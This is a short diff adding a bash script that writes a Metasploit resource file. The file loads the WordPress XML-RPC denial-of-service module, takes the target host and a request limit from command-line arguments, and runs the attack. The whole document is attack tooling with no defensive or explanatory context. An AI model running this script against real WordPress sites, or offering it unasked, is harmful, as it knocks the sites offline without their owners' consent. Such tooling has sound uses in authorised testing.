@@ -1,0 +1,7 @@
+#!/usr/bin/bash
+echo """
+use auxiliary/dos/http/wordpress_xmlrpc_dos
+set RHOST $1
+set RLIMIT $2
+exploit
+""" >> xmlrpcd.rc
